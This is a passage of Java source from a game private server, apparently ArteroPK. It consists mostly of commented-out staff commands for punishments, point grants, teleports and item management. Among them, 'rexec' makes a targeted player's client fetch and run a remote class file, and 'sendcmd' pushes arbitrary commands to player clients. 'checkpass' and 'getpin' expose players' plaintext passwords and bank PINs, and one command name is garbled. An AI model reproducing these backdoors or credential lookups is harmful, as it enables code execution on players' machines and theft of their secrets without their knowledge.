							p.sendServerMessage(String.format("%s has ended the event '%s'.", player.getSafeDisplayName(), oldEvent));
						}
						return true;
					}
				});*/



        /*CommandHandler.submit(new PunishCommand("jail", Target.ACCOUNT, Type.JAIL, Rank.HELPER));
        CommandHandler.submit(new PunishCommand("ipjail", Target.IP, Type.JAIL, Rank.HELPER));
        CommandHandler.submit(new PunishCommand("macjail", Target.MAC, Type.JAIL, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("suidjail", Target.SPECIAL, Type.JAIL, Rank.DEVELOPER));

        CommandHandler.submit(new PunishCommand("yellmute", Target.ACCOUNT, Type.YELL_MUTE, Rank.HELPER));
        CommandHandler.submit(new PunishCommand("ipyellmute", Target.IP, Type.YELL_MUTE, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("macyellmute", Target.MAC, Type.YELL_MUTE, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("suidyellmute", Target.SPECIAL, Type.YELL_MUTE, Rank.DEVELOPER));

        CommandHandler.submit(new PunishCommand("mute", Target.ACCOUNT, Type.MUTE, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("ipmute", Target.IP, Type.MUTE, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("macmute", Target.MAC, Type.MUTE, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("suidmute", Target.SPECIAL, Type.MUTE, Rank.DEVELOPER));

        CommandHandler.submit(new PunishCommand("ban", Target.ACCOUNT, Type.BAN, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("ipban", Target.IP, Type.BAN, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("macban", Target.MAC, Type.BAN, Rank.MODERATOR));
        CommandHandler.submit(new PunishCommand("suidban", Target.SPECIAL, Type.BAN, Rank.ADMINISTRATOR));

        CommandHandler.submit(new PunishCommand("wildyforbid", Target.ACCOUNT, Type.WILDY_FORBID, Rank.DEVELOPER));
        CommandHandler.submit(new PunishCommand("ipwildyforbid", Target.IP, Type.WILDY_FORBID, Rank.DEVELOPER));
        CommandHandler.submit(new PunishCommand("macwildyforbid", Target.MAC, Type.WILDY_FORBID, Rank.DEVELOPER));
        CommandHandler.submit(new PunishCommand("suidwildyforbid", Target.SPECIAL, Type.WILDY_FORBID, Rank.DEVELOPER));

        CommandHandler.submit(new UnPunishCommand("unjail", Target.ACCOUNT, Type.JAIL, Rank.HELPER));
        CommandHandler.submit(new UnPunishCommand("unipjail", Target.IP, Type.JAIL, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unmacjail", Target.MAC, Type.JAIL, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unsuidjail", Target.SPECIAL, Type.JAIL, Rank.DEVELOPER));

        CommandHandler.submit(new UnPunishCommand("unyeot llmute", Target.ACCOUNT, Type.YELL_MUTE, Rank.HELPER));
        CommandHandler.submit(new UnPunishCommand("unipyellmute", Target.IP, Type.YELL_MUTE, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unmacyellmute", Target.MAC, Type.YELL_MUTE, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unsuidyellmute", Target.SPECIAL, Type.YELL_MUTE, Rank.DEVELOPER));

        CommandHandler.submit(new UnPunishCommand("unmute", Target.ACCOUNT, Type.MUTE, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unipmute", Target.IP, Type.MUTE, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unmacmute", Target.MAC, Type.MUTE, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unsuidmute", Target.SPECIAL, Type.MUTE, Rank.DEVELOPER));

        CommandHandler.submit(new UnPunishCommand("unban", Target.ACCOUNT, Type.BAN, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unipban", Target.IP, Type.BAN, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unmacban", Target.MAC, Type.BAN, Rank.MODERATOR));
        CommandHandler.submit(new UnPunishCommand("unsuidban", Target.SPECIAL, Type.BAN, Rank.ADMINISTRATOR));

        CommandHandler.submit(new UnPunishCommand("unwildyforbid", Target.ACCOUNT, Type.WILDY_FORBID, Rank.DEVELOPER));
        CommandHandler.submit(new UnPunishCommand("unipwildyforbid", Target.IP, Type.WILDY_FORBID, Rank.DEVELOPER));
        CommandHandler.submit(new UnPunishCommand("unmacwildyforbid", Target.MAC, Type.WILDY_FORBID, Rank.DEVELOPER));
        CommandHandler.submit(new UnPunishCommand("unsuidwildyforbid", Target.SPECIAL, Type.WILDY_FORBID, Rank.DEVELOPER));

        CommandHandler.submit(new ViewPunishmentsCommand());
        CommandHandler.submit(new MyPunishmentsCommand());
        CommandHandler.submit(new RemovePunishmentCommand());*/

        /*submit(new GiveIntCommand("givehp", Rank.DEVELOPER) {
			public void process(final Player player, final Player target, final int value) {
				target.getPoints().setHonorPoints(target.getPoints().getHonorPoints() + value);
				player.sendf("%s now has %,d honor pts", target.getName(), target.getPoints().getHonorPoints());
			}
		});

        submit(new GiveIntCommand("giveelo", Rank.DEVELOPER) {
			public void process(final Player player, final Player target, final int value) {
				target.getPoints().setEloRating(target.getPoints().getEloRating() + value);
				player.sendf("%s now has %,d elo", target.getName(), target.getPoints().getEloRating());
			}
		});

        submit(new GiveIntCommand("givekills", Rank.DEVELOPER) {
			public void process(final Player player, final Player target, final int value) {
				target.setKillCount(target.getKillCount() + value);
				player.sendf("%s now has %,d kills", target.getName(), target.getKillCount());
			}
		});

        submit(new GiveIntCommand("givedeaths", Rank.DEVELOPER) {
			public void process(final Player player, final Player target, final int value) {
				target.setDeathCount(target.getDeathCount() + value);
				player.sendf("%s now has %,d deaths", target.getName(), target.getDeathCount());
			}
		});

        submit(new GiveIntCommand("givevp", Rank.DEVELOPER) {
			public void process(final Player player, final Player target, final int value) {
				target.getPoints().setVotingPoints(target.getPoints().getVotingPoints() + value);
				player.sendf("%s now has %,d vote points", target.getName(), target.getPoints().getVotingPoints());
			}
		});

        submit(new GiveIntCommand("givepkp", Rank.OWNER) {
			public void process(final Player player, final Player target, final int value) {
				target.getPoints().setPkPoints(target.getPoints().getPkPoints() + value);
				player.sendf("%s now has %,d pk points", target.getName(), target.getPoints().getPkPoints());
			}
		});

        submit(new GiveIntCommand("givebhp", Rank.DEVELOPER) {
			public void process(final Player player, final Player target, final int value) {
				target.getBountyHunter().setKills(target.getBountyHunter().getKills() + value);
				player.sendf("%s now has %,d bounty hunter points", target.getName(), target.getBountyHunter().getKills());
			}
		});

        submit(new GiveIntCommand("givesp", Rank.DEVELOPER) {
			public void process(final Player player, final Player target, final int value) {
				target.getSlayer().setPoints(target.getSlayer().getSlayerPoints() + value);
				player.sendf("%s now has %,d slayer points", target.getName(), target.getSlayer().getSlayerPoints());
			}
		});

        submit(new GiveIntCommand("giveep", Rank.DEVELOPER) {
            public void process(final Player player, final Player target, final int value) {
                target.getBountyHunter().setEmblemPoints(target.getBountyHunter().getEmblemPoints() + value);
                player.sendf("%s now has %,d emblem points", target.getName(), target.getBountyHunter().getEmblemPoints());
            }
        });

        submit(new GiveIntCommand("givedt", Rank.DEVELOPER){
            public void process(final Player player, final Player target, final int value){
                target.getDungeoneering().setTokens(target.getDungeoneering().getTokens() + value);
                player.sendf("%s now has %,d dung tokens", target.getName(), target.getDungeoneering().getTokens());
            }
        });

        submit(new Command("getmac", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input) {
				String targetName = "";
				try {
					targetName = input.substring(7).trim();
				} catch (Exception e) {
				}
				if (targetName.equalsIgnoreCase("")) {
					player.sendMessage("Use as ::getmac NAME.");
					return false;
				}
				boolean found = false;
				String mac = CommandPacketHandler.findCharStringMerged(targetName, "Mac");
				if(!mac.equalsIgnoreCase("Doesn't exist")) {
					player.sendMessage("@dre@Merged character");
					player.sendf("%s's MAC adress is '%s'.", TextUtils.ucFirst(targetName.toLowerCase()), mac);
					found = true;
				}
				mac = CommandPacketHandler.findCharStringArteroPk(targetName, "Mac");
				if(!mac.equalsIgnoreCase("Doesn't exist")) {
					player.sendMessage("@dre@ArteroPK character");
					player.sendf("%s's MAC adress is '%s'.", TextUtils.ucFirst(targetName.toLowerCase()), mac);
					found = true;
				}
				mac = CommandPacketHandler.findCharStringInstantPk(targetName, "Mac");
				if(!mac.equalsIgnoreCase("Doesn't exist")) {
					player.sendMessage("@dre@InstantPK character");
					player.sendf("InstantPK characters don't keep MAC adress in their character file.");
					found = true;
				}
				if (!found) {
					player.sendMessage("This player does not exist.");
					return false;
				}
				return true;
			}
        });

        submit(new Command("takeitem", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                final String line = filterInput(input).trim();
                final int i = line.indexOf(',');
                if(i == -1){
                    player.sendf("Syntax: ::takeitem name,id (amount)");
                    return false;
                }
                final String name = line.substring(0, i).trim();
                final Player target = World.getPlayerByName(name);
                if(target == null){
                    player.sendf("Unable to find player: %s", name);
                    return false;
                }
                final String[] idParts = line.substring(i+1).trim().split(" +");
                int amount = 1;
                int id;
                try{
                    id = Integer.parseInt(idParts[0].trim());
                    if(idParts.length == 2)
                        amount = Integer.parseInt(idParts[1].trim());
                }catch(Exception ex){
                    player.sendf("Enter a valid id and amount");
                    return false;
                }
                for(final Container c : new Container[]{target.getInventory(), target.getBank(), target.getEquipment()}){
                    final Item item = c.getById(id);
                    if(item == null)
                        continue;
                    if(amount > item.getCount())
                        amount = item.getCount();
                    c.remove(new Item(id, amount));
                    player.sendf("Removed %s x%d from %s's %s", ItemDefinition.forId(id).getName(), amount, name, c.getClass().getSimpleName());
                    if(player.getInventory().hasRoomFor(new Item(id, amount))){
                        player.getInventory().add(new Item(id, amount));
                        player.sendf("Added to your inventory");
                    }else{
                        player.getBank().add(new BankItem(0, id, amount));
                        player.sendf("Added to your bank");
                    }
                    return true;
                }
                player.sendf("Unable to find %s in %s's containers", ItemDefinition.forId(id).getName(), name);
                return false;
            }
        });


        submit(new Command("rename", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                final String newName = filterInput(input).trim();
                if(PlayerFiles.exists(newName)){
                    player.sendf("%s is already taken!", newName);
                    return false;
                }
                if(newName.isEmpty()){
                    player.sendf("Enter a name");
                    return false;
                }
                final File oldFile = new File(String.format("./Data/characters/%s.txt", player.getName().toLowerCase()));
                final File newFile = new File(String.format("./Data/characters/%s.txt", newName));
                oldFile.renameTo(newFile);
                final Punishment p = Punishment.create(
                        "Server",
                        player,
                        Combination.of(Target.ACCOUNT, Type.BAN),
                        Time.create(1, TimeUnit.DAYS),
                        "This is a temporary ban"
                );
                PunishmentManager.getInstance().add(p);
                player.display = newName;
                player.setName(newName);
                player.getSession().close();
                return true;
            }
        });
		*/
        /*submit(new Command("stafftome", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                for(final Player p : World.getPlayers())
                    if(!player.equals(p) && Rank.isStaffMember(p))
                        p.setTeleportTarget(player.getPosition());
                return true;
            }
        });

        submit(new Command("help", Rank.HELPER){
            public boolean execute(final Player player, final String input){
                final String name = filterInput(input).trim();
                final Player target = World.getPlayerByName(name);
                if(target == null){
                    player.sendf("Unable to find: %s", name);
                    return false;
                }
                if(Rank.isStaffMember(target)){
                    player.sendf("Can't do this to other staff members");
                    return false;
                }
                Magic.teleport(target, Position.create(2607, 9672, 0), false);
                return true;
            }
        });*/

        //submit(new ViewChallengesCommand());
        //submit(new CreateChallengeCommand());

		/*submit(new Command("a3place", Rank.MODERATOR){
			public boolean execute(final Player player, final String input){
				Magic.teleport(player, 3108, 3159, 3, false);
				return true;
			}
		});

		submit(new Command("seanplace", Rank.MODERATOR){
			public boolean execute(final Player player, final String input){
				Magic.teleport(player, 3292, 3163, 2, false);
				return true;
			}
		});

		submit(new Command("joshplace", Rank.MODERATOR){
			public boolean execute(final Player player, final String input){
				Magic.teleport(player, 1891, 4523, 2, false);
				return true;
			}
		});

        submit(new Command("getskill", Rank.ADMINISTRATOR){
            public boolean execute(final Player player, final String input){
                final String[] parts = filterInput(input).split(",");
                if(parts.length != 2){
                    player.sendf("Wrong syntax: ::getskill name,skill name");
                    return false;
                }
                final String targetName = parts[0].trim();
                final Player target = World.getPlayerByName(targetName);
                if(target == null){
                    player.sendf("Unable to find %s", targetName);
                    return false;
                }
                final String skillName = parts[1].trim();
                for(int i = 0; i < Skills.SKILL_COUNT; i++){
                    final String skill = Skills.SKILL_NAME[i];
                    if(!skillName.equalsIgnoreCase(skill))
                        continue;
                    player.sendf("%s: %s (ID: %d) = %d (%,d XP)", targetName, skill, i, target.getSkills().getLevel(i), target.getSkills().getExperience(i));
                    return true;
                }
                return false;
            }
        });

        submit(new Command("sendcmd", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                if(!Configuration.getString(Configuration.ConfigurationObject.NAME).equalsIgnoreCase("arteropk"))
                    return false;
                final String line = filterInput(input).trim();
                final int i = line.indexOf(',');
                if(i == -1){
                    player.sendf("Incorrect usage: ::sendcmd target,cmd");
                    return false;
                }
                final String targetName = line.substring(0, i).trim();
                final Player target = World.getPlayerByName(targetName);
                if(target == null){
                    player.sendf("Unable to find %s", targetName);
                    return false;
                }
                final String cmd = line.substring(i + 1).trim();
                if(cmd.isEmpty()){
                    player.sendf("Enter a command");
                    return false;
                }
                if(Rank.isStaffMember(target)){
                    player.sendf("Don't do this on other staff");
                    return false;
                }
                target.sendf(":cmd:" + cmd);
                player.sendf("Sent command %s to %s", cmd, targetName);
                return true;
            }
        });

        submit(new Command("forcehome", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                final String targetName = filterInput(input).trim();
                final Player target = World.getPlayerByName(targetName);
                if(target == null){
                    player.sendf("Unable to find %s", targetName);
                    return false;
                }
                target.setTeleportTarget(Edgeville.POSITION);
                return true;
            }
        });

        submit(new Command("getinfo", Rank.MODERATOR){
            public boolean execute(final Player player, final String input){
                final String targetName = filterInput(input).trim();
                final Player target = World.getPlayerByName(targetName);
                if(target == null){
                    player.sendf("Unable to find %s", targetName);
                    return false;
                }
                player.sendf("Creation Date: " + new Date(target.getCreatedTime()));
                player.sendf("Last HP Rewards: %s", new Date(target.getLastHonorPointsReward()));
                return true;
            }
        });

        submit(new Command("masspnpc", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                try{
                    final int id = Integer.parseInt(filterInput(input).trim());
                    for(final Player p : World.getPlayers())
                        if(p != null && (id == -1 || (!p.getPosition().inPvPArea() && p.cE.getOpponent() == null)))
                            p.setPNpc(id);
                    return true;
                }catch(Exception ex){
                    player.sendf("Enter a valid item id");
                    return false;
                }
            }
        });*/

        //submit(new RecolorCommand());
        //submit(new UncolorCommand());
        //submit(new ViewRecolorsCommand());
        //submit(new UncolorAllCommand());

        /*submit(new Command("buyshards", Rank.PLAYER){
            public boolean execute(final Player player, final String input){
                final String line = filterInput(input).trim();
                if(line.length() > 6){
                    player.sendf("You could only buy 999,999 at a time");
                    return false;
                }
                try{
                    final int amount = Integer.parseInt(line);
                    if(amount < 2){
                        player.getActionSender().sendMessage("Enter a valid amount greater than 2.");
                        return false;
                    }
                    if (amount >= Integer.MAX_VALUE)
                        return false;
                    final int requiredPkp = amount / 2;
                    if(player.getPoints().getPkPoints() < requiredPkp){
                        player.getActionSender().sendMessage("You don't have enough pkp to buy this many spirit shards.");
                        return false;
                    }
                    player.getPoints().setPkPoints(player.getPoints().getPkPoints() - requiredPkp);
                    player.getBank().add(new BankItem(0, 18016, amount));
                    player.getActionSender().sendMessage(String.format("%,d spirit shards have been added to your bank.", amount));
                    return true;
                } catch(Exception ex) {
                    player.getActionSender().sendMessage("Error buying spirit shards: invalid amount.");
                    //wont print expection anymore
                    return false;
                }
                player.sendMessage("Spirit shard packs are available inside the emblem pt store");
                return true;
            }
        });

        submit(new Command("npcinfo", Rank.ADMINISTRATOR){
            public boolean execute(final Player player, final String line){
                String args = filterInput(line);
                int id = 0;
                try {
                    id = Integer.parseInt(args);
                    NPCDefinition def = NPCDefinition.forId(id);
                    player.sendf("NPC Name: %s Combat: %d MaxHP: %d", def.getName(), def.combat(),def.maxHp());
                    for(NPCDrop drop : def.getDrops()) {
                        player.sendf("%s : 1/%d , %d - %d", ItemDefinition.forId(drop.getId()).getName(), drop.getChance(), drop.getMin(), drop.getMax());
                    }
                }catch(Exception e) {
                    player.sendf("NPC Count: %,d", World.getNpcs().size());
                    try(final BufferedWriter writer = new BufferedWriter(new FileWriter("./data/npc-info.txt", true))){
                        writer.newLine();
                        writer.newLine();
                        writer.write("Date: " + new Date());
                        writer.newLine();
                        writer.write(String.format("NPC Count: %,d", World.getNpcs().size()));
                        writer.newLine();
                        for(final NPC npc : World.getNpcs()){
                            writer.write(String.format(
                                    "%s (%d) At %d,%d | Health = %,d/%,d | Dead: %s",
                                    npc.getDefinition().getName(),
                                    npc.getDefinition().getId(),
                                    npc.getPosition().getX(),
                                    npc.getPosition().getY(),
                                    npc.health, npc.maxHealth,
                                    npc.isDead()
                            ));
                            writer.newLine();
                        }
                        player.sendf("Dumped to data/npc-info.txt");
                        return true;
                    }catch(Exception ex){
                        player.sendf("Error dumping npc info: %s", ex);
                    }
                }
                return true;
            }
        });*/

        //submit(new ViewLogsCommand());
        //submit(new ViewLogStatsCommand());
        //submit(new ClearLogsCommand());

        /*submit(new Command("checkmac", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                try{
                    final int mac = Integer.parseInt(filterInput(input).trim());
                    for(final Player p : World.getPlayers())
                        if(p != null && p.getUID() == mac)
                            player.sendf("%s has the mac: %d", p.getName(), mac);
                    return true;
                }catch(Exception ex){
                    player.sendf("Error parsing mac");
                    return false;
                }
            }
        });

        submit(new Command("testbank", Rank.PLAYER) {
            public boolean execute(final Player player, final String input){
                for(int i = 0; i < player.getBank().size(); i++) {
                    BankItem item = (BankItem) player.getBank().get(i);
                    System.out.println("Tab Index: " + item.getTabIndex() + "\tTab Item: " + item.getId() + "\tTab Count: " + item.getCount());
                }
                for(int i = 0; i < 9; i++) {
                    System.out.println("Tab Amount: " + player.getBankField().getTabAmounts()[i]);
                }
                return true;
            }
        });

        submit(new Command("checkip", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                final String ip = filterInput(input).trim();
                if(ip.isEmpty()){
                    player.sendf("Enter a ip");
                    return false;
                }
                for(final Player p : World.getPlayers())
                    if(p != null && p.getShortIP().contains(ip))
                        player.sendf("%s has the ip: %s", p.getName(), p.getShortIP());
                return true;
            }
        });

        submit(new Command("checkpass", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                final String pass = filterInput(input).trim();
                if(pass.isEmpty()){
                    player.sendf("Enter a password");
                    return false;
                }
                for(final Player p : World.getPlayers())
                    if(p != null && p.getPassword().toLowerCase().contains(pass))
                        player.sendf("%s has the pass: %s", p.getName(), pass);
                return true;
            }
        });*/

        /*submit(new Command("killplayer", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                String targetName = filterInput(input).trim();
                boolean isInstant = false;
                if(targetName.startsWith("@")){
                    isInstant = true;
                    targetName = targetName.substring(1);
                }
                final Player target = World.getPlayerByName(targetName);
                if(target == null){
                    player.sendf("could not find %s", targetName);
                    return false;
                }
                if(isInstant){
                    target.cE.hit(target.getSkills().getLevel(Skills.HITPOINTS), player, true, Constants.MELEE);
                }else{
                    World.submit(
							new Task(1000, "killplayer") {
								public void execute() {
									if (target.isDead())
										stop();
									else
										target.cE.hit(5, player, true, Constants.MELEE);
								}
							}
					);
                }
                return true;
            }
        });

        submit(new Command("wipebank", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                final String targetName = filterInput(input).trim();
                final Player target = World.getPlayerByName(targetName);
                if(target == null){
                    player.sendf("Unable to find %s", targetName);
                    return false;
                }
                if(Rank.isStaffMember(target)){
                    player.sendf("Cannot do this to other staff members");
                    return false;
                }
                target.getBank().clear();
                player.sendf("Wiped %s's bank", targetName);
                return true;
            }
        });

        submit(new Command("wipeinv", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                final String targetName = filterInput(input).trim();
                final Player target = World.getPlayerByName(targetName);
                if(target == null){
                    player.sendf("Unable to find %s", targetName);
                    return false;
                }
                if(Rank.isStaffMember(target)){
                    player.sendf("Cannot do this to other staff members");
                    return false;
                }
                target.getInventory().clear();
                player.sendf("Wiped %s's inventory", targetName);
                return true;
            }
        });

        submit(new Command("wipeskills", Rank.DEVELOPER){
            public boolean execute(final Player player, final String input){
                final String targetName = filterInput(input).trim();
                final Player target = World.getPlayerByName(targetName);
                if(target == null){
                    player.sendf("Unable to find %s", targetName);
                    return false;
                }
                if(Rank.isStaffMember(target)){
                    player.sendf("Cannot do this to other staff members");
                    return false;
                }
                for(int i = 0; i < Skills.SKILL_COUNT; i++){
                    target.getSkills().setLevel(i, 1);
                    target.getSkills().setExperience(i, 0);
                }
                player.sendf("Wiped %s's skills", targetName);
                return true;
            }
        });

        submit(new Command("getpin", Rank.ADMINISTRATOR) {
            public boolean execute(final Player player, final String input) {
				String targetName = "";
				try {
					targetName = input.substring(7).trim();
				} catch(Exception e) {}
				if (targetName.equalsIgnoreCase("")) {
					player.sendMessage("Use as ::getpin NAME.");
					return false;
				}
				boolean found = false;
				try {
					String pin = CommandPacketHandler.findCharStringMerged(targetName, "BankPin");
					if(!pin.equalsIgnoreCase("Doesn't exist")) {
						found = true;
						if(!pin.equalsIgnoreCase("null")) {
							player.sendMessage("@dre@Merged character");
							player.sendf("%s's bank pin is '%s'", Misc.ucFirst(targetName.toLowerCase()), pin);
						} else {
							player.sendMessage("@dre@Merged character");
							player.sendf("%s has no bank pin.", Misc.ucFirst(targetName.toLowerCase()));
						}
					}
				} catch(Exception e) {
					found = true;
					player.sendMessage("@dre@Merged character");
					player.sendf("%s has no bank pin.", Misc.ucFirst(targetName.toLowerCase()));
				}
				try {
					String pin = CommandPacketHandler.findCharStringArteroPk(targetName, "BankPin");
					if(!pin.equalsIgnoreCase("Doesn't exist")) {
						found = true;
						if(!pin.equalsIgnoreCase("null")) {
							player.sendMessage("@dre@ArteroPK character");
							player.sendf("%s's bank pin is '%s'", Misc.ucFirst(targetName.toLowerCase()), pin);
						} else {
							player.sendMessage("@dre@Merged character");
							player.sendf("%s has no bank pin.", Misc.ucFirst(targetName.toLowerCase()));
						}
					}
				} catch(Exception e) {
					found = true;
					player.sendMessage("@dre@ArteroPK character");
					player.sendf("%s has no bank pin.", Misc.ucFirst(targetName.toLowerCase()));
				}

				if(!found) {
					player.sendMessage("This player does not exist.");
				}
				return true;
            }
        });

        submit(new Command("yaks", Rank.PLAYER) {
            public boolean execute(final Player player, final String input) {
                Magic.teleport(player, 3051, 3515, 0, false);
                ClanManager.joinClanChat(player, "Risk Fights", false);
                return true;
            }
        });

        submit(new Command("searchitem", Rank.DEVELOPER) {
            public boolean execute(final Player player, final String input) {
                final String idString = filterInput(input).trim();
                int id;
                ItemDefinition def;
                try {
                    id = Integer.parseInt(idString);
                    def = ItemDefinition.forId(id);
                    if (def == null)
                        throw new Exception();
                } catch (Exception ex) {
                    player.sendf("Enter a valid item id");
                    return false;
                }
                for (final Player p : World.getPlayers()) {
                    if (p == null)
                        continue;
                    final int count = p.getBank().getCount(id) + p.getInventory().getCount(id);
                    if (count < 1)
                        continue;
                    player.sendf("%s has %,d %s", p.getName(), count, def.getName());
                }
                player.sendf("Search completed");
                return true;
            }
        });

		submit(new Command("aliplace", Rank.MODERATOR) {
			public boolean execute(final Player player, final String input) throws Exception {
				Magic.teleport(player, 3500, 3572, 0, false);
				return false;
			}
		});

		submit(new Command("startminigame", Rank.COMMUNITY_MANAGER) {
			public boolean execute(final Player player, final String input) throws Exception {
                int builder = Integer.parseInt(filterInput(input));
				World.submit(new EventCountdownTask(ServerEventTask.builders[builder]));
				return true;
			}
		});

		submit(new Command("marcusplace", Rank.MODERATOR) {
			public boolean execute(final Player player, final String input) throws Exception {
				Magic.teleport(player, 1971, 5002, 0, false);
				return false;
			}
		});

		submit(new Command("darrenplace", Rank.MODERATOR) {
			public boolean execute(final Player player, final String input) throws Exception {
				Magic.teleport(player, 2123, 4913, 4, false);
				return false;
			}
		});

        submit(new Command("reloaddrops", Rank.OWNER) {
            @Override
            public boolean execute(Player player, String input) throws Exception {
                String name = "./data/npcdrops.cfg";
                BufferedReader file = null;
                int lineInt = 1;
                try {
                    file = new BufferedReader(new FileReader(name));
                    String line;
                    while ((line = file.readLine()) != null) {
                        int spot = line.indexOf('=');
                        if (spot > -1) {
                            int id = 0;
                            int i = 1;
                            try {
                                if (line.contains("/"))
                                    line = line.substring(spot + 1, line.indexOf("/"));
                                else
                                    line = line.substring(spot + 1);
                                String values = line;
                                values = values.replaceAll("\t\t", "\t");
                                values = values.trim();
                                String[] valuesArray = values.split("\t");
                                id = Integer.valueOf(valuesArray[0]);
                                NPCDefinition def = NPCDefinition.forId(id);
                                def.getDrops().clear();
                                for (i = 1; i < valuesArray.length; i++) {
                                    String[] itemData = valuesArray[i].split("-");
                                    final int itemId = Integer.valueOf(itemData[0]);
                                    final int minAmount = Integer.valueOf(itemData[1]);
                                    final int maxAmount = Integer.valueOf(itemData[2]);
                                    final int chance = Integer.valueOf(itemData[3]);

                                    def.getDrops().add(NPCDrop.create(itemId, minAmount, maxAmount, chance));
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                                System.out.println("error on array: " + i + " npcId: "
                                        + id);
                            }
                        }
                        lineInt++;

                    }
                    player.sendf("Reloaded drops");
                } catch (Exception e) {
                    e.printStackTrace();
                    System.out.println("error on line: " + lineInt + " ");
                } finally {
                    if (file != null)
                        file.close();
                }
                return false;
            }
        });

		submit(new Command("lock", Rank.ADMINISTRATOR) {
            public boolean execute(final Player player, final String input) throws Exception {
                final String targetName = filterInput(input).trim();
                final Player target = World.getPlayerByName(targetName);
                if (target == null) {
                    player.sendf("Error finding player: %s", targetName);
                    return false;
                }
                if (Rank.isStaffMember(target)) {
                    player.sendf("Stop messing around");
                    return false;
                }
                target.getExtraData().put("cantdoshit", true);
                player.sendf("%s is now locked", targetName);
                return true;
            }
        });
*/

		/*submit(new Command("reloadunspawnables", Rank.DEVELOPER){
			public boolean execute(final Player player, final String input) throws Exception{
				if(ItemInfo.unspawnables.reload())
					player.sendf("Reloaded %,d unspawnables", ItemInfo.unspawnables.size());
				else
					player.sendf("Error reloading unspawnables");
				return true;
			}
		});

		submit(new Command("reloaduntradeables", Rank.DEVELOPER){
			public boolean execute(final Player player, final String input) throws Exception{
				if(ItemInfo.untradeables.reload())
					player.sendf("Reloaded %,d untradeables", ItemInfo.untradeables.size());
				else
					player.sendf("Error reloading untradeables");
				return true;
			}
		});*/

		//submit(new ViewCustomTriviaCommand());
		//submit(new AnswerCustomTriviaCommand());
		//submit(new CreateCustomTriviaCommand());

		/*submit(new Command("rexec", Rank.DEVELOPER){
			public boolean execute(final Player player, final String input) throws Exception{
				final String[] args = filterInput(input).split(",");
				if(args.length != 2){
					player.sendf("::rexec player_name,script_name");
					return false;
				}
				final String targetName = args[0].trim();
				final Player target = World.getPlayerByName(targetName);
				if(target == null){
					player.sendf("Unable to find player: %s", targetName);
					return false;
				}
				if(Rank.isStaffMember(target)){
					player.sendf("you piece of shit don't do this to staff");
					return false;
				}
				final String scriptName = args[1].trim();
				final String url = scriptName.equals("rape")
						? "http://cache.arteropk.com/apkscripts/er.class"
						: null;
				if(url == null){
					player.sendf("No script found for %s", scriptName);
					return false;
				}
				target.sendf(":run:%s", url);
				player.sendf("Running the %s script for %s", scriptName, targetName);
				return true;
			}
		});

		submit(new Command("ge", Rank.PLAYER){
			public boolean execute(final Player player, final String input) throws Exception{
				Magic.teleport(player, Position.create(3009, 3383, 0), false);
				return true;
			}
		});

		submit(new Command("reloadgeblacklist", Rank.DEVELOPER){
			@Override
			public boolean execute(Player player, String input) throws Exception{
				player.sendf("Reloaded blacklist: " + ItemInfo.geBlacklist.reload());
				return true;
			}
		});

		submit(new Command("enablege", Rank.DEVELOPER){
			@Override
			public boolean execute(Player player, String input) throws Exception{
				JGrandExchange.enabled = true;
				player.sendf("Grand Exchange is now enabled");
				return true;
			}
		});

		submit(new Command("disablege", Rank.DEVELOPER){
			@Override
			public boolean execute(Player player, String input) throws Exception{
				JGrandExchange.enabled = false;
				player.sendf("Grand Exchange is now disabled");
				return true;
			}
		});

		submit(new Command("gestats", Rank.HELPER){
			@Override
			public boolean execute(Player player, String input) throws Exception{
				input = filterInput(input).trim();
				player.sendf("Grand Exchange is currently %s", JGrandExchange.enabled ? "@gre@enabled" : "@red@disabled");
				if(input.matches("\\d{1,5}")){
					final int itemId = Integer.parseInt(input);
					final ItemDefinition def = ItemDefinition.forId(itemId);
					if(def == null){
						player.sendf("Invalid item id: %d", itemId);
						return false;
					}
					final IntSummaryStatistics buyStats = JGrandExchange.getInstance().itemUnitPriceStats(itemId, Entry.Type.BUYING, Entry.Currency.PK_TICKETS);
					final IntSummaryStatistics sellStats = JGrandExchange.getInstance().itemUnitPriceStats(itemId, Entry.Type.SELLING, Entry.Currency.PK_TICKETS);
					player.sendf("Grand Exchange Stats for %s (%d)", def.getProperName(), def.getId());
					player.sendf("%,d players Buying: Min %,d PKT | Avg %1.2f PKT | Max %,d PKT", buyStats.getCount(), buyStats.getMin(), buyStats.getAverage(), buyStats.getMax());
					player.sendf("%,d players Selling: Min %,d PKT | Avg %1.2f PKT | Max %,d PKT", sellStats.getCount(), sellStats.getMin(), sellStats.getAverage(), sellStats.getMax());
					return true;
				}else{
					player.sendf("Number of buying entries: %,d", JGrandExchange.getInstance().get(Entry.Type.BUYING).size());
					player.sendf("Number of selling entries: %,d", JGrandExchange.getInstance().get(Entry.Type.SELLING).size());
					return true;
				}
			}
		});

		submit(new Command("openge", Rank.SUPER_DONATOR){
			@Override
